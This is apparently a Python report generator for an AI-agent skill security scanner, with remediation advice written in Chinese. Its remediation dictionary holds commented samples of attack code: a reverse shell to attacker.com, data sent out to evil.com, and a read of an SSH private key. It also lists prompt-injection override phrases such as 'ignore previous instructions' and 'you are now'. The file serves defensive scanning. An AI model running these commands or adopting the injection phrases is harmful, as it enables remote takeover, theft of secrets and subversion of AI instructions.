#!/usr/bin/env python3
"""
Enhanced Reporter v6.1 - 增强版报告生成器

特性：
1. 分层输出 - 简洁/标准/详细模式
2. 可视化 HTML 报告 - Chart.js 图表
3. 进度提示 - tqdm 进度条
4. 修复建议 - 可操作的修复指南
"""

import json
import sys
from pathlib import Path
from typing import Dict, List, Optional
from datetime import datetime
from dataclasses import dataclass


@dataclass
class Finding:
    """发现项"""
    rule_id: str
    title: str
    description: str
    severity: str
    file_path: str
    line_number: int
    code_snippet: str
    remediation: str


# 修复建议库
REMEDIATION_GUIDE = {
    'base64_decode_execute': {
        'title': 'Base64 编码执行',
        'risk': '可能隐藏恶意代码，执行未知的危险操作',
        'fix': '检查解码后的内容，确认是否为必要操作',
        'code_example': '''# 使用前先解码检查
import base64

# 解码并查看内容
decoded = base64.b64decode(encoded_data)
print(f"解码内容: {decoded}")

# 确认安全后再执行
if is_safe(decoded):
    exec(decoded)  # 仅在确认安全后执行
''',
    },
    'credential_theft': {
        'title': '凭证窃取',
        'risk': '可能窃取 SSH 密钥、AWS 凭证、浏览器密码等敏感信息',
        'fix': '移除凭证读取代码，使用安全的认证方式',
        'code_example': '''# 不要直接读取敏感文件
# ❌ 错误示例
# with open("~/.ssh/id_rsa") as f:
#     key = f.read()

# ✅ 正确做法：使用环境变量或密钥管理服务
import os
api_key = os.environ.get("API_KEY")

# 或使用密钥管理服务
from aws_secrets import get_secret
db_password = get_secret("db_password")
''',
    },
    'reverse_shell': {
        'title': '反向 Shell',
        'risk': '允许攻击者远程控制你的电脑',
        'fix': '移除反向 shell 代码，使用合法的远程管理工具',
        'code_example': '''# ❌ 危险代码
# import socket, subprocess
# s = socket.socket()
# s.connect(("attacker.com", 4444))
# subprocess.call(["/bin/sh", "-i"], stdout=s)

# ✅ 使用合法的远程管理工具
# - SSH
# - Ansible
# - 远程桌面
''',
    },
    'prompt_injection': {
        'title': '提示词注入',
        'risk': '可能绕过系统限制，执行未授权操作',
        'fix': '对用户输入进行验证和清理',
        'code_example': '''# ❌ 危险代码
# prompt = f"用户说: {user_input}"

# ✅ 正确做法：验证和清理输入
import re

def sanitize_input(user_input: str) -> str:
    # 移除危险模式
    dangerous_patterns = [
        r"ignore (all )?previous instructions",
        r"forget (everything|all)",
        r"you are now",
        r"DAN",
    ]
    
    for pattern in dangerous_patterns:
        user_input = re.sub(pattern, "", user_input, flags=re.IGNORECASE)
    
    return user_input.strip()

prompt = f"用户说: {sanitize_input(user_input)}"
''',
    },
    'exfiltration': {
        'title': '数据外传',
        'risk': '可能将敏感数据发送到外部服务器',
        'fix': '移除外部数据传输，或使用白名单验证目标',
        'code_example': '''# ❌ 危险代码
# import requests
# data = read_sensitive_file()
# requests.post("https://evil.com/collect", json=data)

# ✅ 正确做法：使用白名单验证
ALLOWED_DOMAINS = ["api.trusted-service.com"]

def send_data(url: str, data: dict):
    from urllib.parse import urlparse
    domain = urlparse(url).netloc
    
    if domain not in ALLOWED_DOMAINS:
        raise ValueError(f"不允许发送数据到: {domain}")
    
    # 记录所有数据传输
    log_data_transfer(url, data)
    
    return requests.post(url, json=data)
''',
    },
}


class EnhancedReporter:
    """增强版报告生成器"""
    
    def __init__(self, lang: str = 'zh'):
        self.lang = lang
    
    def print_summary(self, result: Dict, verbose: bool = False):
        """
        打印简洁摘要
        
        Args:
            result: 扫描结果
            verbose: 是否显示详细信息
        """
        skill_name = result.get('skill_name', 'Unknown')
        risk_level = result.get('risk_level', 'UNKNOWN')
        score = result.get('score', 0)
        findings = result.get('findings', [])
        
        # 风险等级图标
        icons = {
            'LOW': '🟢',
            'MEDIUM': '🟡',
            'HIGH': '🟠',
            'EXTREME': '🔴',
        }
        icon = icons.get(risk_level, '⚪')
        
        # 打印摘要
        print(f"\n{'='*60}")
        print(f"🔍 扫描完成: {skill_name}")
        print(f"{'='*60}")
        print(f"\n风险等级: {icon} {risk_level} ({score}/100)")
        print(f"扫描时间: {result.get('scan_time', 0):.2f}s")
        print(f"发现项: {len(findings)} 个")
        
        # 统计各严重度
        severity_counts = {}
        for f in findings:
            sev = f.get('severity', 'UNKNOWN')
            severity_counts[sev] = severity_counts.get(sev, 0) + 1
        
        if severity_counts:
            print(f"\n严重度分布:")
            for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
                if sev in severity_counts:
                    print(f"  {sev}: {severity_counts[sev]}")
        
        # 建议
        print(f"\n{'='*60}")
        print(self._get_recommendation(risk_level))
        print(f"{'='*60}")
        
        # 关键发现
        critical_high = [f for f in findings 
                        if f.get('severity') in ('CRITICAL', 'HIGH')]
        
        if critical_high:
            print(f"\n⚠️  关键问题 ({len(critical_high)} 个):")
            for i, finding in enumerate(critical_high[:5], 1):
                self._print_finding_brief(finding, i)
        
        if verbose:
            self._print_detailed(result)
    
    def _print_finding_brief(self, finding: Dict, index: int):
        """打印发现项简要信息"""
        severity = finding.get('severity', 'UNKNOWN')
        title = finding.get('title', '未知问题')
        file_path = finding.get('file', '')
        line = finding.get('line_number', 0)
        
        # 严重度颜色
        colors = {
            'CRITICAL': '\033[91m',  # 红色
            'HIGH': '\033[93m',      # 黄色
            'MEDIUM': '\033[94m',    # 蓝色
            'LOW': '\033[92m',       # 绿色
            'INFO': '\033[90m',      # 灰色
        }
        reset = '\033[0m'
        color = colors.get(severity, '')
        
        print(f"\n{index}. {color}[{severity}]{reset} {title}")
        if file_path:
            print(f"   📄 {file_path}:{line}")
    
    def _print_detailed(self, result: Dict):
        """打印详细信息"""
        findings = result.get('findings', [])
        
        print(f"\n{'='*60}")
        print("📋 详细发现")
        print(f"{'='*60}")
        
        for i, finding in enumerate(findings, 1):
            print(f"\n--- 发现 {i} ---")
            print(f"标题: {finding.get('title', '未知问题')}")
            print(f"严重度: {finding.get('severity', 'UNKNOWN')}")
            print(f"描述: {finding.get('description', '')}")
            
            if finding.get('file'):
                print(f"文件: {finding.get('file')}")
            if finding.get('line_number'):
                print(f"行号: {finding.get('line_number')}")
            
            # 修复建议
            rule_id = finding.get('rule_id', '')
            if rule_id in REMEDIATION_GUIDE:
                guide = REMEDIATION_GUIDE[rule_id]
                print(f"\n🔧 修复建议:")
                print(f"   {guide['fix']}")
    
    def _get_recommendation(self, risk_level: str) -> str:
        """获取建议"""
        recommendations = {
            'LOW': '✅ 可安全安装',
            'MEDIUM': '⚠️ 安装前请审查发现的问题',
            'HIGH': '❌ 不建议安装，存在高风险问题',
            'EXTREME': '🚨 立即阻止安装，检测到严重安全威胁',
        }
        return recommendations.get(risk_level, '')
    
    def generate_html_report(self, result: Dict, output_path: Path):
        """
        生成可视化 HTML 报告
        
        Args:
            result: 扫描结果
            output_path: 输出文件路径
        """
        skill_name = result.get('skill_name', 'Unknown')
        risk_level = result.get('risk_level', 'UNKNOWN')
        score = result.get('score', 0)
        findings = result.get('findings', [])
        
        # 统计各严重度
        severity_counts = {}
        for f in findings:
            sev = f.get('severity', 'UNKNOWN')
            severity_counts[sev] = severity_counts.get(sev, 0) + 1
        
        # 颜色映射
        colors = {
            'CRITICAL': '#dc3545',
            'HIGH': '#fd7e14',
            'MEDIUM': '#ffc107',
            'LOW': '#28a745',
            'INFO': '#6c757d',
        }
        
        html_template = f'''<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X Skill Scanner Report - {skill_name}</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .header h1 {{
            font-size: 2em;
            margin-bottom: 10px;
        }}
        .risk-badge {{
            display: inline-block;
            padding: 10px 20px;
            border-radius: 25px;
            font-weight: bold;
            font-size: 1.2em;
            margin-top: 15px;
        }}
        .risk-LOW {{ background: #28a745; }}
        .risk-MEDIUM {{ background: #ffc107; color: #333; }}
        .risk-HIGH {{ background: #fd7e14; }}
        .risk-EXTREME {{ background: #dc3545; }}
        
        .stats-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        .stat-card {{
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .stat-card h3 {{
            color: #666;
            font-size: 0.9em;
            margin-bottom: 10px;
        }}
        .stat-card .value {{
            font-size: 2.5em;
            font-weight: bold;
            color: #333;
        }}
        
        .chart-container {{
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }}
        .chart-wrapper {{
            max-width: 400px;
            margin: 0 auto;
        }}
        
        .findings-section {{
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .findings-section h2 {{
            margin-bottom: 20px;
            color: #333;
        }}
        .finding-item {{
            border-left: 4px solid #ddd;
            padding: 15px;
            margin-bottom: 15px;
            background: #f9f9f9;
            border-radius: 0 5px 5px 0;
        }}
        .finding-CRITICAL {{ border-left-color: {colors['CRITICAL']}; }}
        .finding-HIGH {{ border-left-color: {colors['HIGH']}; }}
        .finding-MEDIUM {{ border-left-color: {colors['MEDIUM']}; }}
        .finding-LOW {{ border-left-color: {colors['LOW']}; }}
        
        .finding-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }}
        .finding-title {{
            font-weight: bold;
            color: #333;
        }}
        .severity-badge {{
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 0.85em;
            font-weight: bold;
            color: white;
        }}
        .finding-location {{
            font-size: 0.9em;
            color: #666;
            margin-top: 5px;
        }}
        .finding-description {{
            margin-top: 10px;
            color: #555;
        }}
        
        .footer {{
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 0.9em;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ X Skill Scanner Report</h1>
            <p>扫描目标: {skill_name}</p>
            <p>扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <div class="risk-badge risk-{risk_level}">
                {risk_level} - {score}/100
            </div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>风险分数</h3>
                <div class="value">{score}</div>
            </div>
            <div class="stat-card">
                <h3>发现项总数</h3>
                <div class="value">{len(findings)}</div>
            </div>
            <div class="stat-card">
                <h3>关键问题</h3>
                <div class="value">{severity_counts.get('CRITICAL', 0) + severity_counts.get('HIGH', 0)}</div>
            </div>
            <div class="stat-card">
                <h3>扫描时间</h3>
                <div class="value">{result.get('scan_time', 0):.1f}s</div>
            </div>
        </div>
        
        <div class="chart-container">
            <h2>📊 严重度分布</h2>
            <div class="chart-wrapper">
                <canvas id="severityChart"></canvas>
            </div>
        </div>
        
        <div class="findings-section">
            <h2>📋 发现详情</h2>
            {self._generate_findings_html(findings, colors)}
        </div>
        
        <div class="footer">
            <p>Generated by X Skill Scanner v6.1 | {datetime.now().strftime('%Y-%m-%d')}</p>
        </div>
    </div>
    
    <script>
        // 严重度分布图表
        const ctx = document.getElementById('severityChart').getContext('2d');
        new Chart(ctx, {{
            type: 'doughnut',
            data: {{
                labels: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'],
                datasets: [{{
                    data: [
                        {severity_counts.get('CRITICAL', 0)},
                        {severity_counts.get('HIGH', 0)},
                        {severity_counts.get('MEDIUM', 0)},
                        {severity_counts.get('LOW', 0)},
                        {severity_counts.get('INFO', 0)}
                    ],
                    backgroundColor: [
                        '{colors["CRITICAL"]}',
                        '{colors["HIGH"]}',
                        '{colors["MEDIUM"]}',
                        '{colors["LOW"]}',
                        '{colors["INFO"]}'
                    ],
                    borderWidth: 2,
                    borderColor: '#fff'
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{
                        position: 'bottom'
                    }}
                }}
            }}
        }});
    </script>
</body>
</html>'''
        
        # 写入文件
        output_path.write_text(html_template, encoding='utf-8')
        print(f"\n✅ HTML 报告已生成: {output_path}")
    
    def _generate_findings_html(self, findings: List[Dict], colors: Dict) -> str:
        """生成发现项 HTML"""
        if not findings:
            return '<p>✅ 未发现安全问题</p>'
        
        html_parts = []
        for finding in findings:
            severity = finding.get('severity', 'INFO')
            title = finding.get('title', '未知问题')
            description = finding.get('description', '')
            file_path = finding.get('file', '')
            line = finding.get('line_number', 0)
            
            html = f'''
            <div class="finding-item finding-{severity}">
                <div class="finding-header">
                    <span class="finding-title">{title}</span>
                    <span class="severity-badge" style="background: {colors.get(severity, '#6c757d')}">
                        {severity}
                    </span>
                </div>
                <div class="finding-location">
                    📄 {file_path}:{line}
                </div>
                <div class="finding-description">
                    {description}
                </div>
            </div>'''
            html_parts.append(html)
        
        return '\n'.join(html_parts)


# CLI 入口
if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Enhanced Reporter')
    parser.add_argument('--json-input', required=True, help='JSON 结果文件')
    parser.add_argument('--output', required=True, help='输出 HTML 文件')
    parser.add_argument('--lang', default='zh', help='语言')
    
    args = parser.parse_args()
    
    # 读取 JSON 结果
    with open(args.json_input, 'r', encoding='utf-8') as f:
        result = json.load(f)
    
    # 生成报告
    reporter = EnhancedReporter(lang=args.lang)
    reporter.generate_html_report(result, Path(args.output))